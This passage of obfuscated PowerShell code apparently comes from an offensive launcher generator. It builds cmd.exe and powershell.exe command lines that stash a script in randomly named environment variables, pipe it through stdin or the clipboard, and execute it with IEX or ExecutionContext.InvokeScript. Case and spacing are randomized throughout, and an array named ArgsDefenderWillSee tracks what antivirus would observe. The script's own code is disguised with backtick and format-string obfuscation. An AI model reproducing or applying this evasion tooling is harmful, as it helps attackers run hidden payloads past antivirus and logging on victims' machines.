                  If(${sc`RIPT`str`Ing}.("{2}{0}{1}"-f'tain','s','Con').Invoke("^^^$Char")) {${Scrip`T`sTr`ing} = ${ScR`iptstr`INg}.("{0}{1}{2}"-f'R','eplac','e').Invoke("^^^$Char","^$Char")}
              }
              If(${scR`iptSTrI`NG}.("{1}{0}"-f'ains','Cont').Invoke(("{1}{0}"-f '^','^^^')))
              {
                  ${scRiP`TS`TR`ING} = ${SCR`iP`TsTRinG}.("{0}{1}"-f 'Replac','e').Invoke(("{1}{0}"-f'^^^','^'),'^^')
              }

              
              If(${sCriP`Tst`RI`Ng}.("{0}{1}" -f 'Contain','s').Invoke('\"')) {${sCRip`T`S`TrING} = ${Scri`Pts`TRi`Ng}.("{0}{1}"-f'Repla','ce').Invoke('\"','"')}
              
              
              
              ${C`HArS`F`oRv`Arname} = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
              ${V`A`RIAB`LeN`AME}  = (&("{0}{1}{2}"-f'Ge','t-Ran','dom') -Input ${cHA`R`sForva`Rn`AMe} -Count (${C`HaR`sfo`RVARNaMe}."COU`NT"/(&("{0}{2}{1}"-f 'Get-R','m','ando') -Input @(5..10)))) -Join ''
              ${vA`RiAB`L`enAmE}  = ([Char[]]${vArIa`BL`ENAmE}.("{0}{1}{2}" -f'ToLo','w','er').Invoke() | &("{1}{4}{0}{2}{3}" -f 'a','Fo','ch-Objec','t','rE') {${c`HAR} = ${_}; If(&("{1}{2}{0}"-f'Random','Ge','t-') -Input (0..1)){${C`HAR} = ${ch`AR}.("{0}{2}{1}"-f 'ToS','ring','t').Invoke().("{1}{0}"-f 'pper','ToU').Invoke()} ${CH`Ar}}) -Join ''
              ${V`ARi`ABLenAm`E2} = (&("{3}{0}{1}{2}" -f'et-R','and','om','G') -Input ${chA`R`sF`orVarNA`Me} -Count (${chArsFOrV`AR`N`Ame}."Co`UNT"/(&("{0}{2}{1}"-f'Ge','om','t-Rand') -Input @(5..10)))) -Join ''
              ${V`ARiA`Bl`ENa`me2} = ([Char[]]${va`RI`A`BL`EnAme2}.("{1}{0}" -f'ower','ToL').Invoke() | &("{1}{3}{0}{2}{4}"-f'Each-O','Fo','bj','r','ect') {${C`HAR} = ${_}; If(&("{0}{1}{2}" -f'Get-','R','andom') -Input (0..1)){${cH`Ar} = ${ch`Ar}.("{2}{0}{1}"-f'oStr','ing','T').Invoke().("{0}{1}"-f 'ToU','pper').Invoke()} ${C`har}}) -Join ''

              
              ${seTS`Y`NTax}  = ([Char[]]'set' | &("{4}{2}{0}{1}{3}" -f 'a','ch-Obj','rE','ect','Fo') {${C`HaR} = ${_}; If(&("{1}{3}{2}{0}"-f'm','Get-R','o','and') -Input (0..1)){${C`har} = ${c`HaR}.("{0}{2}{1}" -f 'ToStr','ng','i').Invoke().("{0}{1}" -f'ToUpp','er').Invoke()} ${C`HAR}}) -Join ''
              ${se`TsYnt`Ax}  = ${set`sY`NTAX} + ' '*(&("{0}{1}{2}"-f 'Get-Ra','n','dom') -Minimum 2 -Maximum 4) + ${V`ARIa`BlEN`Ame} + '='
              ${S`etSYn`T`AX2} = ([Char[]]'set' | &("{2}{0}{1}{3}"-f 'rEa','ch-Obje','Fo','ct') {${cH`Ar} = ${_}; If(&("{1}{2}{0}"-f 'Random','Get','-') -Input (0..1)){${CH`Ar} = ${c`haR}.("{0}{1}" -f'To','String').Invoke().("{2}{1}{0}"-f 'r','Uppe','To').Invoke()} ${Ch`Ar}}) -Join ''
              ${seTSY`N`Tax2} = ${s`e`TSynt`AX2} + ' '*(&("{2}{1}{0}" -f'om','-Rand','Get') -Minimum 2 -Maximum 4) + ${VAri`AB`lenam`E2} + '='

              
              ${S`e`T`SynTAx}     = ([Char[]]${seTsyn`T`Ax}.("{2}{1}{0}"-f 'er','Low','To').Invoke()     | &("{2}{0}{1}" -f 'b','ject','ForEach-O') {${c`haR} = ${_}; If(&("{0}{2}{1}" -f'G','-Random','et') -Input (0..1)){${c`HaR} = ${ch`Ar}.("{1}{0}{2}" -f 'rin','ToSt','g').Invoke().("{0}{1}" -f'T','oUpper').Invoke()} ${Ch`Ar}}) -Join ''
              ${S`eTsy`NTax2}    = ([Char[]]${setSYN`T`AX2}.("{0}{1}"-f 'ToLo','wer').Invoke()    | &("{3}{1}{2}{0}" -f'ect','Ea','ch-Obj','For') {${c`haR} = ${_}; If(&("{1}{2}{0}"-f't-Random','G','e') -Input (0..1)){${ch`AR} = ${cH`Ar}.("{2}{0}{1}" -f'in','g','ToStr').Invoke().("{0}{2}{1}"-f'T','Upper','o').Invoke()} ${c`HAR}}) -Join ''
              ${v`AriABl`EN`Ame}  = ([Char[]]${VAr`i`AblEnA`ME}.("{1}{0}" -f'r','ToLowe').Invoke()  | &("{3}{1}{4}{2}{0}"-f 'ct','Eac','je','For','h-Ob') {${Ch`Ar} = ${_}; If(&("{0}{2}{1}"-f 'Get-R','om','and') -Input (0..1)){${ch`Ar} = ${C`hAR}.("{1}{0}{2}"-f'o','T','String').Invoke().("{1}{0}"-f'per','ToUp').Invoke()} ${CH`AR}}) -Join ''
              ${va`Ri`ABlENAM`e2} = ([Char[]]${VAriA`B`le`NamE2}.("{2}{0}{1}" -f'owe','r','ToL').Invoke() | &("{2}{4}{0}{3}{1}" -f'c','ject','Fo','h-Ob','rEa') {${c`HAr} = ${_}; If(&("{1}{2}{0}" -f'Random','G','et-') -Input (0..1)){${C`HAR} = ${C`HAr}.("{2}{1}{0}" -f 'ing','r','ToSt').Invoke().("{0}{1}"-f'ToUp','per').Invoke()} ${c`HaR}}) -Join ''
    
              
              ${InvOKEO`PtI`on} = &("{7}{1}{5}{4}{0}{2}{8}{6}{3}" -f 'mEnvir','omInvok','onmen','bleSyntax','do','eRan','ria','Out-Rand','tVa') ${v`ArIaB`LE`NaME}

              
              ForEach(${CH`AR} in @('<','>','|','&'))
              {
                  If(${i`NVo`Ke`optI`ON}.("{0}{2}{1}"-f'Co','ains','nt').Invoke("^$Char"))
                  {
                      ${inVO`KeOP`TI`oN} = ${INvO`keO`p`TI`ON}.("{0}{1}"-f 'Repla','ce').Invoke("^$Char","^^^$Char")
                  }
              }

              
              ${Pscm`dSyn`TAx} = ${p`Ow`ers`HE`llFlAgS} + ' '*(&("{0}{2}{3}{1}" -f'Ge','om','t-R','and') -Minimum 1 -Maximum 3) + ${i`NV`OkE`Opti`On}
              ${Cmd`s`ynT`AX2}  = ${S`Las`HC} + ' '*(&("{0}{1}{2}"-f'Get-R','an','dom') -Minimum 0 -Maximum 2) + "%$VariableName2%"
              ${CMD`syN`TAX}   = ${S`LAsHC} + ' '*(&("{0}{2}{1}"-f 'Get','om','-Rand') -Minimum 0 -Maximum 4) + '"' + ${s`eTs`YNT`AX} + ${s`C`Rip`TS`TRing} + '&&' + ${s`EtSYN`TaX2} + ${PATh`T`Op`oWe`RSheLL} + ${PScm`D`syn`TaX} + '&&' + ' '*(&("{1}{2}{0}"-f 'om','Get','-Rand') -Minimum 0 -Maximum 4) + ${pathTo`c`md} + ${C`MD`syntax2} + '"'
    
              
              ${args`De`F`en`DerW`ilLseE} += , @(${Pat`HTo`cmd}       , ${cm`DsYnT`Ax})
              ${ARG`sDef`En`Der`will`SEe} += , @(${pATH`TO`Cmd}       , ${CMdSY`N`TAX2})
              ${aRg`sd`EFE`NderWi`llsEe} += , @(${PathT`o`pOw`ER`SHE`lL}, ${Psc`m`dsynTAx}.("{0}{1}{2}" -f 'Re','pla','ce').Invoke('^',''))

              ${cM`dliNeOu`Tput} = ${p`Ath`Toc`md} + ${C`mds`Yntax}
          }
        9 {
              
              
              
              
              
              If(${ScR`I`Pt`stR`inG}.("{0}{1}"-f 'Contain','s').Invoke('\"')) {${SCRip`TST`RiNg} = ${S`CriPTsTri`NG}.("{1}{0}" -f'eplace','R').Invoke('\"','"')}
              
              
              
              ${CharSF`o`RVaRn`A`ME} = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
              ${vARI`ABL`eNa`ME}  = (&("{2}{0}{1}" -f 'Ran','dom','Get-') -Input ${C`H`Arsf`OrVarn`AMe} -Count (${Cha`Rsf`OrV`ArnaME}."C`oUnT"/(&("{2}{0}{1}"-f 'and','om','Get-R') -Input @(5..10)))) -Join ''
              ${va`RIaBLENA`ME}  = ([Char[]]${vArI`AbLE`NA`mE}.("{0}{1}{2}"-f 'To','Lowe','r').Invoke() | &("{2}{0}{1}{3}" -f'Each','-Obj','For','ect') {${CH`AR} = ${_}; If(&("{1}{0}{2}" -f 'e','G','t-Random') -Input (0..1)){${CH`Ar} = ${C`HAR}.("{1}{0}{2}"-f'tr','ToS','ing').Invoke().("{1}{0}"-f'pper','ToU').Invoke()} ${c`Har}}) -Join ''
              ${var`iaBL`E`N`AME2} = (&("{1}{0}{2}"-f'a','Get-R','ndom') -Input ${CharSf`Or`Va`RnaME} -Count (${cHa`RsFOR`Va`RNaME}."coU`Nt"/(&("{2}{3}{0}{1}"-f'Rando','m','Ge','t-') -Input @(5..10)))) -Join ''
              ${v`ARIabL`Enam`E2} = ([Char[]]${vAriA`BLE`NA`ME2}.("{1}{0}" -f 'oLower','T').Invoke() | &("{1}{2}{0}{3}"-f'rEac','F','o','h-Object') {${cH`AR} = ${_}; If(&("{0}{2}{1}"-f 'Get-R','dom','an') -Input (0..1)){${c`HAr} = ${CH`AR}.("{2}{0}{1}" -f'S','tring','To').Invoke().("{0}{1}"-f'To','Upper').Invoke()} ${C`haR}}) -Join ''

              
              ${sETs`y`N`TAx}  = ([Char[]]'set' | &("{2}{3}{0}{1}"-f 'Obj','ect','ForEac','h-') {${c`hAr} = ${_}; If(&("{2}{0}{1}" -f 'et-Rand','om','G') -Input (0..1)){${C`hAR} = ${c`hAr}.("{0}{1}{2}"-f 'T','oStr','ing').Invoke().("{1}{2}{0}" -f 'er','T','oUpp').Invoke()} ${c`haR}}) -Join ''
              ${se`TsYN`Tax}  = ${s`e`TsyNt`AX} + ' '*(&("{3}{0}{2}{1}"-f't','om','-Rand','Ge') -Minimum 2 -Maximum 4) + ${v`AriAB`l`EnAME} + '='
              ${S`Et`s`YnTAX2} = ([Char[]]'set' | &("{0}{2}{3}{1}{4}"-f 'ForEa','c','ch-Obj','e','t') {${ch`AR} = ${_}; If(&("{1}{2}{0}"-f'om','G','et-Rand') -Input (0..1)){${CH`AR} = ${CH`Ar}.("{0}{2}{1}"-f'T','ng','oStri').Invoke().("{2}{1}{0}"-f'er','Upp','To').Invoke()} ${CH`Ar}}) -Join ''
              ${se`T`SYNTAx2} = ${sEtsYn`T`A`X2} + ' '*(&("{3}{2}{1}{0}"-f 'om','-Rand','t','Ge') -Minimum 2 -Maximum 4) + ${V`A`R`iABleN`AmE2} + '='

              
              ${EXEc`CON`T`ex`TVarIa`BLe}  = @()
              ${Ex`ec`C`O`Ntex`TvARIABlE} += '(' + (&("{2}{3}{1}{0}" -f'dom','Ran','Get','-') -Input @('DIR',("{2}{1}{0}"-f'm','t-ChildIte','Ge'),'GCI',("{0}{1}{2}" -f 'C','hildIt','em'),'LS',("{2}{0}{1}" -f 't','em','Get-I'),'GI',("{0}{1}" -f 'It','em'))) + ' ' + ("{2}{0}{1}" -f'iable',':','var') + (&("{0}{1}{2}"-f'G','et','-Random') -Input @(("{0}{1}"-f'Ex','*xt'),'E*t',("{0}{1}"-f '*xec*','t'),("{1}{0}" -f'*t','*ecu'),("{0}{1}{2}" -f'*','cut*','t'),("{0}{1}" -f'*c','uti*t'),("{1}{0}{2}" -f'u','*','ti*t'),("{0}{1}" -f'E*e','xt'),("{1}{0}"-f'*xt','E'),("{1}{0}"-f'Cont*','E*'),("{1}{2}{0}"-f 'te*','E*','on'),("{0}{1}" -f 'E*tex','*'),("{1}{2}{3}{5}{0}{4}"-f 't','Exec','u','tio','ext','nCon'))) + ((("{1}{0}" -f'e',').Valu')))
              
              ${exE`CCO`Nt`E`XTVarIab`LE} = &("{2}{0}{1}"-f 'Rand','om','Get-') -Input ${execCO`NTExtvA`RIA`BLE}

              
              ${Ge`TRaND`OM`VA`RiaB`lesy`NtAx}  = @()
              ${G`etRAnd`oM`V`ArIaBl`eSyn`TAX} += '(' + (&("{1}{0}{2}" -f't-Rando','Ge','m') -Input @('DIR',("{1}{0}{2}{3}"-f'e','G','t-ChildIt','em'),'GCI',("{1}{0}" -f'hildItem','C'),'LS',("{1}{0}" -f'-Item','Get'),'GI',("{0}{1}" -f 'I','tem'))) + ' ' + ("{1}{0}" -f 'nv:','e') + ${VAria`BLe`NAme} + ((("{2}{1}{0}"-f'lue','.Va',')')))
              ${GE`T`RaN`DOMv`ArIaBles`Y`Ntax} += ('(' + ((("{8}{1}{5}{0}{7}{3}{10}{4}{9}{6}{2}{11}"-f 'ent]:','Env','ria','tEn','ir','ironm','Va',':Ge','[','onment','v','ble('))) + "'$VariableName'" + ',' + ((("{0}{1}{3}{2}{4}" -f 'MkxPr','o','M','cess','kx'))."R`E`place"(([chaR]77+[chaR]107+[chaR]120),[STring][chaR]39)) + ')' + ')')
              
              ${g`etrANDOMVarI`AB`L`EsYNtax} = &("{0}{2}{1}" -f 'Get','andom','-R') -Input ${gEtrANDOM`Va`R`iAb`lesyN`T`Ax}

              
              ${I`NVoKEO`pT`IONs}  = @()
              ${I`NvOkEopt`IOnS} += (&("{2}{0}{1}" -f 'do','m','Get-Ran') -Input ('IEX',("{2}{1}{0}{3}" -f 'ressi','-Exp','Invoke','on'))) + ' '*(&("{0}{2}{1}" -f'Get-Ra','om','nd') -Minimum 1 -Maximum 3) + ${getRan`dO`Mvari`Ab`l`eSY`Ntax}
              ${iNVo`k`E`OpTi`Ons} += (&("{2}{0}{1}"-f'n','dom','Get-Ra') -Input @((('IwkExecuti'+'onC'+'o'+'nte'+'xt')."re`pL`Ace"('Iwk',[stRiNg][chaR]36)),'${ExecutionContext}',${eX`ecContEXt`VaR`IAB`LE})) + ((("{1}{4}{0}{2}{3}" -f'eCommand.I','.In','nvok','eScript(','vok'))) + ' '*(&("{1}{2}{0}"-f'm','G','et-Rando') -Minimum 0 -Maximum 3) + ${GEtraNdoMVAri`ABl`EsYn`T`AX} + ' '*(&("{0}{1}{2}"-f 'Ge','t-Rando','m') -Minimum 0 -Maximum 3) + ')'
              
              ${In`V`oK`eOPT`iOn} = &("{1}{2}{0}" -f 'om','Get','-Rand') -Input ${iNvoK`e`O`ptiOns}

              
              ${sEtS`Y`NtAX}            = ([Char[]]${Se`T`synt`AX}.("{1}{0}"-f'Lower','To').Invoke()            | &("{2}{0}{1}" -f'jec','t','ForEach-Ob') {${cH`Ar} = ${_}; If(&("{3}{1}{2}{0}" -f 'm','n','do','Get-Ra') -Input (0..1)){${c`hAr} = ${cH`Ar}.("{0}{1}" -f'To','String').Invoke().("{0}{1}{2}" -f'T','oU','pper').Invoke()} ${c`HaR}}) -Join ''
              ${set`S`yN`TaX2}           = ([Char[]]${s`ETs`Y`NTAx2}.("{1}{0}"-f'ower','ToL').Invoke()           | &("{2}{1}{3}{0}" -f'Object','orEa','F','ch-') {${C`HAR} = ${_}; If(&("{1}{0}{2}"-f 't-','Ge','Random') -Input (0..1)){${C`hAR} = ${CH`Ar}.("{1}{0}"-f 'tring','ToS').Invoke().("{0}{1}" -f 'ToU','pper').Invoke()} ${Ch`AR}}) -Join ''
              ${VArIA`BL`enaME}         = ([Char[]]${varIAB`LeN`AmE}.("{1}{2}{0}"-f 'wer','ToL','o').Invoke()         | &("{0}{1}{2}"-f'For','Each-Obj','ect') {${CH`AR} = ${_}; If(&("{1}{0}{2}" -f 'et-R','G','andom') -Input (0..1)){${c`hAr} = ${cH`AR}.("{1}{0}" -f'ng','ToStri').Invoke().("{1}{0}"-f'Upper','To').Invoke()} ${C`haR}}) -Join ''
              ${V`ARiabLE`N`Am`E2}        = ([Char[]]${VA`R`I`Abl`eNAmE2}.("{0}{1}"-f 'ToLowe','r').Invoke()        | &("{1}{2}{0}"-f 'h-Object','ForEa','c') {${Ch`Ar} = ${_}; If(&("{3}{2}{1}{0}" -f'dom','n','t-Ra','Ge') -Input (0..1)){${Ch`Ar} = ${C`har}.("{1}{0}{2}"-f'oSt','T','ring').Invoke().("{0}{2}{1}"-f'ToUp','r','pe').Invoke()} ${c`HaR}}) -Join ''
              ${INv`oKeopT`IoN}         = ([Char[]]${INVO`K`EO`PtIoN}.("{2}{1}{0}"-f 'ower','L','To').Invoke()         | &("{3}{2}{1}{0}" -f'ject','b','h-O','ForEac') {${C`HAr} = ${_}; If(&("{1}{2}{0}" -f'om','Get-R','and') -Input (0..1)){${C`har} = ${c`Har}.("{1}{0}"-f 'tring','ToS').Invoke().("{0}{1}{2}" -f'To','Up','per').Invoke()} ${cH`AR}}) -Join ''
              ${eX`eCC`ontEx`T`VariABlE}  = ([Char[]]${eX`eCCoN`TExTVArIa`BLe}.("{2}{1}{0}" -f'wer','o','ToL').Invoke()  | &("{3}{1}{4}{2}{0}"-f 'ct','h','e','ForEac','-Obj') {${c`har} = ${_}; If(&("{2}{0}{3}{1}"-f'Ra','m','Get-','ndo') -Input (0..1)){${ch`AR} = ${CH`Ar}.("{0}{1}"-f'To','String').Invoke().("{0}{1}"-f'ToUp','per').Invoke()} ${c`hAR}}) -Join ''
              ${G`ET`R`An`do`mVAriA`BLesYNtAx} = ([Char[]]${Ge`TrAnDOM`V`AR`iabL`eSYNt`Ax}.("{1}{0}"-f 'r','ToLowe').Invoke() | &("{3}{1}{0}{2}" -f'h-','Eac','Object','For') {${Ch`AR} = ${_}; If(&("{1}{0}{3}{2}" -f 'R','Get-','m','ando') -Input (0..1)){${c`HAr} = ${CH`AR}.("{2}{0}{1}"-f 'Strin','g','To').Invoke().("{1}{0}" -f'oUpper','T').Invoke()} ${cH`Ar}}) -Join ''

              
              ${in`VOKeV`ARIa`BlES`y`NtAX} = &("{1}{5}{8}{6}{2}{7}{0}{4}{3}"-f'bleSynt','Out-Ran','i','x','a','domIn','mEnv','ronmentVaria','vokeRando') ${VAr`IA`B`lENAMe}

              
              ${poW`erShE`Ll`s`Td`IN} = &("{6}{1}{5}{8}{0}{4}{7}{9}{3}{2}"-f'llSt','a','yntax','eS','dInIn','ndomP','Out-R','vo','owerShe','k')
              
              
              ForEach(${cH`AR} in ${ch`A`RStO`eSC`APe})
              {
                  If(${Scr`iPTs`TrIng}.("{0}{1}" -f'Con','tains').Invoke("^^^$Char")) {${s`C`RI`pt`sTrIng} = ${ScriPt`St`RI`NG}.("{2}{0}{1}" -f 'p','lace','Re').Invoke("^^^$Char","^$Char")}
    
                  If(${PoWE`RSHE`l`lSt`DIN}.("{0}{2}{1}"-f 'Cont','ns','ai').Invoke("^$Char")) {${pOweRsH`eL`l`S`TdiN} = ${PowE`R`S`HellSTdin}.("{2}{1}{0}" -f'ce','a','Repl').Invoke("^$Char","^^^$Char")}
              }
              If(${scr`IpTS`TR`iNG}.("{2}{1}{0}" -f'ins','onta','C').Invoke(("{1}{0}"-f'^^','^^')))
              {
                  ${s`cript`sT`RI`Ng} = ${SCrI`PtSt`R`I`Ng}.("{0}{1}" -f 'Re','place').Invoke(("{0}{1}"-f '^','^^^'),'^^')
              }

              
              ${Ps`Cm`DsYn`Tax} = ${POWerSh`E`L`l`FLagS} + ' '*(&("{3}{2}{1}{0}"-f'om','nd','a','Get-R') -Minimum 1 -Maximum 3) + ${pOw`ERShe`ll`s`TDIN} + ' '*(&("{2}{1}{0}"-f'Random','-','Get') -Minimum 0 -Maximum 3)
              ${C`mdsYnta`x2}  = ${SlAS`hc} + ' '*(&("{0}{2}{3}{1}" -f'G','andom','et-','R') -Minimum 0 -Maximum 2) + "%$VariableName2%"
              ${c`M`DsyNTaX}   = ${s`lA`sHc} + ' '*(&("{1}{2}{0}" -f'andom','Get-','R') -Minimum 0 -Maximum 4) + '"' + ${sE`TSynT`AX} + ' '*(&("{0}{2}{1}{3}"-f 'Get','a','-R','ndom') -Minimum 0 -Maximum 3)+ ${s`CRIp`TstRInG} + ' '*(&("{0}{1}{2}"-f'Get','-R','andom') -Minimum 0 -Maximum 3) + '&&' + ' '*(&("{1}{2}{0}"-f 'dom','G','et-Ran') -Minimum 0 -Maximum 3) + ${setSY`Nta`X2} + ${Ec`Ho} + ' '*(&("{0}{2}{1}" -f 'Ge','dom','t-Ran') -Minimum 1 -Maximum 3) + ${i`NvOKeO`ptI`on} + ' '*(&("{0}{2}{1}" -f'G','andom','et-R') -Minimum 0 -Maximum 3) + '^|' + ' '*(&("{0}{1}{2}" -f'Get','-Ran','dom') -Minimum 0 -Maximum 3) + ${PA`Th`T`oPoweRShElL} + ${pSC`MDSy`NTax} + '&&' + ' '*(&("{3}{2}{0}{1}" -f 'Rand','om','-','Get') -Minimum 0 -Maximum 3) + ${PA`T`HtoCMd} + ${C`M`DSYntaX2} + '"'
    
              
              ${aRg`SDEFeNdE`R`WIlLs`EE} += , @(${Pa`T`HTOcmD}       , ${Cm`dSyN`TaX})
              ${A`RgsD`E`F`eNDeRWillS`ee} += , @(${pA`THt`OCmD}       , ${CM`d`Synt`AX2})
              ${aRGs`DeFe`N`D`Er`wILLS`ee} += , @(${PATHTOp`Ower`s`hEll}, ${P`sCmD`SYnTaX}.("{2}{0}{1}"-f 'la','ce','Rep').Invoke('^',''))

              ${CMD`LI`N`e`OutPut} = ${P`AT`HToc`md} + ${c`Mdsy`NTAx}
          }
        10 {
              
              
              

              
              If(${s`Cr`iPTsTRi`Ng}.("{0}{1}{2}"-f'Con','ta','ins').Invoke('\"')) {${scri`p`T`STrING} = ${SCr`I`P`TstrinG}.("{1}{0}" -f'place','Re').Invoke('\"','"')}
             
              
              ${p`Ow`eR`sHELLClip} = &("{5}{3}{0}{6}{2}{4}{7}{1}"-f 'C','tax','oa','dom','rdInvokeSy','Out-Ran','lipb','n')

              
              ForEach(${cH`Ar} in @('<','>','|','&'))
              {
                  
                  If(${pOw`ERsHEl`Lc`L`iP}.("{1}{0}{2}"-f 'onta','C','ins').Invoke("^$Char")) 
                  {
                      ${P`oWeRsH`E`l`lclIP} = ${P`oW`e`RshElLClIp}.("{1}{0}{2}" -f 'ac','Repl','e').Invoke("^$Char","^^^$Char")
                  }
              }

              
              
              
              
              
              ${C`o`mmaNDfl`AgvA`lue} = ${nu`ll}
              If(${PsbouNd`PA`R`Am`EtERs}[("{1}{0}"-f 'nd','Comma')] -OR ${comM`A`Nd})
              {
                  ${uPp`E`Rlim`iT} = ${P`OwER`SH`Ellf`La`gsARrAY}."CO`UNt"-1
                  ${cOMm`A`NdFla`gvaLue} = ${POwEr`S`he`Ll`FlagS`A`RRAY}[${PO`wErs`Hel`l`F`la`GSaRray}."co`Unt"-1]
              }
              Else
              {
                  ${uPpeRl`i`M`it} = ${p`oWER`she`llfLaGsA`RR`AY}."CO`UNt"
              }

              
              ${powER`she`LL`F`lAGS} = @()
              For(${I}=0; ${I} -lt ${uppE`R`liM`it}; ${i}++)
              {
                  ${P`OwErsHell`F`la`Gs} += ${PO`W`e`Rs`heLLFlAg`SarRay}[${i}]
              }

              
              ${PoweRshe`lLfL`A`gS} += (&("{0}{1}{2}{3}"-f 'Get-','Ra','n','dom') -Input @('-st',("{0}{1}" -f '-','sta')))
              
              
              
              If(${P`OWeRs`heL`Lfla`gs}."COU`Nt" -gt 1)
              {
                  ${poW`er`S`HeLlFla`GS} = &("{1}{0}{2}{3}" -f 'et-','G','Ran','dom') -InputObject ${Powe`RsHEllf`l`A`Gs} -Count ${PO`wErSHe`l`lFLA`gs}."cO`UNT"
              }

              
              If(${c`OmMAND`FL`AGvaLuE})
              {
                  ${poWE`RS`HelLF`LAGs} += ${c`OM`Ma`NDF`lagVaLuE}
              }

              
              For(${I}=0; ${I} -lt ${PO`WerShELLf`LAGS}."C`ouNt"; ${i}++)
              {
                  ${po`wE`RsH`el`lFLAgS}[${i}] = ([Char[]]${p`OwE`RS`HElLf`laGS}[${I}] | &("{0}{2}{3}{1}"-f 'For','ct','Ea','ch-Obje') {${Ch`Ar} = ${_}.("{0}{1}" -f 'ToStrin','g').Invoke().("{0}{1}{2}"-f 'ToL','ow','er').Invoke(); If(&("{1}{3}{0}{2}" -f'and','Get-','om','R') -Input @(0..1)) {${C`HaR} = ${c`har}.("{0}{1}"-f 'ToUp','per').Invoke()} ${CH`AR}}) -Join ''
              }

              
              ${poWe`R`sHE`LLFlA`GS} = (${p`oweRS`He`LlF`LaGs} | &("{2}{1}{3}{0}" -f'ct','a','ForE','ch-Obje') {${_} + ' '*(&("{2}{0}{1}" -f 'nd','om','Get-Ra') -Minimum 1 -Maximum 3)}) -Join ''
              ${POwEr`Shell`FLA`gS} = ' '*(&("{1}{2}{0}"-f 'm','Get-Rand','o') -Minimum 1 -Maximum 3) + ${P`oweRS`hEL`LfLags} + ' '*(&("{1}{2}{0}"-f 'andom','Get','-R') -Minimum 1 -Maximum 3)

              
              ${P`ScMds`ynTAx} = ${PoweRs`he`L`lFLAgs} + ${PO`wE`RsH`E`LLCLip}
              ${CM`d`S`ynTaX2}  = ${S`Las`HC} + ' '*(&("{1}{2}{0}{3}"-f 'o','Ge','t-Rand','m') -Minimum 0 -Maximum 4) + ${PA`T`htOPOWE`RsH`Ell} + ${P`ScmD`sYn`TAx}
              ${CM`D`SYn`Tax}   = ${s`lAS`hC} + ' '*(&("{1}{0}{2}"-f 't-R','Ge','andom') -Minimum 0 -Maximum 4) + '"'  + ' '*(&("{2}{0}{1}"-f 't','-Random','Ge') -Minimum 0 -Maximum 3) + ${EC`hO} + (&("{0}{1}{2}" -f 'Get-R','a','ndom') -Input ('/','\',' '*(&("{1}{3}{0}{2}" -f'ando','Get-','m','R') -Minimum 1 -Maximum 3))) + ${scr`iPtsT`R`InG} + ' '*(&("{0}{1}{2}" -f 'Ge','t-Ra','ndom') -Minimum 0 -Maximum 2) + '|' + ' '*(&("{1}{0}{2}"-f'et-Ra','G','ndom') -Minimum 0 -Maximum 2) + ${Pa`T`htoclIP} + ' '*(&("{0}{1}{2}" -f'G','et-Rand','om') -Minimum 0 -Maximum 2) + '&&' + ${PaThTo`c`md} + ${cmD`sy`NtAx2} + '"'
    
              
              ${ARG`sDeFE`Nd`ERw`ILLs`Ee} += , @(${pAT`h`TOcmd}       , ${c`M`DsYNt`Ax})
              ${a`RGsdeF`E`Nd`eRW`i`lLSeE} += , @(${PA`THT`Oc`md}       , ${cMDS`yNt`Ax2})
              ${A`RGS`deF`en`dE`RWILLseE} += , @(${pA`TH`T`OPoW`ERSh`ell}, ${PSC`m`dSy`NtaX}.("{1}{2}{0}" -f 'ce','Re','pla').Invoke('^',''))

              ${Cm`DLiNeo`UTp`Ut} = ${PAThTO`c`md} + ${CMDs`y`NTAx}
          }
        11 {
              
              
              

              

              
              ForEach(${CH`Ar} in ${Cha`R`s`T`OesCaPE})
              {
                  If(${scRipt`S`TRIng}.("{0}{1}"-f'Contai','ns').Invoke("^^^$Char")) {${sC`Rip`TsTR`iNg} = ${sCr`iPTStR`inG}.("{1}{0}{2}" -f 'a','Repl','ce').Invoke("^^^$Char","^$Char")}
              }
              If(${s`cr`iPTs`Tring}.("{1}{2}{0}"-f 'ins','Con','ta').Invoke(("{1}{0}" -f'^^','^^')))
              {
                  ${SCR`Ipts`TRing} = ${scRip`Ts`TrINg}.("{0}{1}" -f'Replac','e').Invoke(("{0}{1}" -f '^^^','^'),'^^')
              }

              
              If(${SCri`PTStRI`Ng}.("{0}{1}" -f 'Contain','s').Invoke('\"')) {${s`Cri`p`TsTriNg} = ${sc`RI`p`TSt`Ring}.("{1}{2}{0}" -f'lace','Re','p').Invoke('\"','"')}
              
              
              
              ${ChaR`s`F`oRVA`RNaMe} = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z')
              ${v`AriaBle`NAMe}  = (&("{1}{2}{0}{3}" -f'R','Get','-','andom') -Input ${cHarS`ForV`A`Rn`AmE} -Count (${C`HARSFORVARnA`ME}."c`OunT"/(&("{2}{0}{1}" -f't-','Random','Ge') -Input @(5..10)))) -Join ''
              ${V`AriABl`En`Ame}  = ([Char[]]${V`ARI`ABLEnAmE}.("{0}{1}"-f 'To','Lower').Invoke() | &("{3}{2}{4}{1}{0}" -f 't','c','ch-O','ForEa','bje') {${CH`AR} = ${_}; If(&("{1}{0}{2}"-f'et','G','-Random') -Input (0..1)){${c`har} = ${cH`Ar}.("{0}{1}" -f 'ToS','tring').Invoke().("{1}{0}{2}" -f 'Upp','To','er').Invoke()} ${c`haR}}) -Join ''
              
              
              ${SeTSy`Nt`AX}  = ([Char[]]'set' | &("{0}{3}{2}{1}"-f 'F','ect','ch-Obj','orEa') {${Ch`Ar} = ${_}; If(&("{0}{1}{2}" -f'Get','-Rando','m') -Input (0..1)){${C`hAR} = ${C`HAR}.("{0}{1}{2}" -f'T','oStrin','g').Invoke().("{1}{0}" -f'r','ToUppe').Invoke()} ${cH`AR}}) -Join ''
              ${s`Etsy`NtAX}  = ${SetsY`N`TAx} + ' '*(&("{3}{0}{1}{2}" -f 'et','-R','andom','G') -Minimum 2 -Maximum 4) + ${vA`R`Iabl`E`NAmE} + '='
              
              
              ${SE`TSynT`Ax}     = ([Char[]]${seTs`Y`NTaX}.("{0}{1}" -f'T','oLower').Invoke()     | &("{1}{2}{3}{0}"-f'ject','F','orEach-','Ob') {${c`har} = ${_}; If(&("{1}{0}{2}"-f 't-Ra','Ge','ndom') -Input (0..1)){${Ch`AR} = ${c`hAr}.("{1}{2}{0}"-f'tring','To','S').Invoke().("{1}{0}" -f 'per','ToUp').Invoke()} ${CH`AR}}) -Join ''
